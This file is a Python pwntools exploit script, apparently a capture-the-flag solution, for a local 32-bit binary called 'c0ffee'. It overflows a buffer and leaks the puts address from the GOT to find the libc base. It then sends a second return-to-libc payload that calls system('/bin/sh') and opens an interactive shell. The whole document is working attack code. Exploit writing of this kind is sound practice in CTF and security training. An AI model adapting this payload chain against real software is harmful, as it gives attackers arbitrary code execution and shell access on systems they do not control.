#!/usr/bin/python

from pwn import *

r = process("./c0ffee")
elf = ELF("./c0ffee")
libc = ELF("/lib/i386-linux-gnu/libc-2.23.so")
puts_offset = libc.symbols["puts"]
system_offset = libc.symbols["system"]
bin_sh_offset = next(libc.search("/bin/sh"))
puts_plt = elf.plt["puts"]
puts_got = elf.got["puts"]
main = 0x08048920

r.recvuntil("cups> ")
r.sendline("4")

for i in range(10):
	r.recvuntil("size> ")
	r.sendline("127")
	r.send("A"*127)
	r.recvuntil("Which one, sir?\n")
	r.sendline("2")
	r.recvuntil("anything else, sir?\n")
	r.sendline("yes\x00AAAA")  #set ebp-0x548 = 0	

payload = "A"*20 + p32(puts_plt) + p32(main) + p32(puts_got)
r.recvuntil("size> ")
r.sendline(str(len(payload)))
r.send(payload)
r.recvuntil("Which one, sir?\n")
r.sendline("2")
r.recvuntil("anything else, sir?\n")
r.sendline("A")
r.recvuntil("receipt: \n")
r.recvline()
puts_addr = u32(r.recv(4))
base_libc = puts_addr - puts_offset
system_addr = base_libc + system_offset
bin_sh_addr = bin_sh_offset + base_libc

log.info("base_libc: %s" % hex(base_libc))
log.info("puts_addr: %s" % hex(puts_addr))

r.recvuntil("cups> ")
r.sendline("4")

for i in range(10):
        r.recvuntil("size> ")
        r.sendline("127")
        r.send("A"*127)
        r.recvuntil("Which one, sir?\n")
        r.sendline("2")
        r.recvuntil("anything else, sir?\n")
        r.sendline("yes\x00AAAA") 

payload = "A"*20 + p32(system_addr) + "AAAA" + p32(bin_sh_addr)
r.recvuntil("size> ")
r.sendline(str(len(payload)))
r.send(payload)
r.recvuntil("Which one, sir?\n")
r.sendline("2")
r.recvuntil("anything else, sir?\n")
r.sendline("A")
r.interactive()
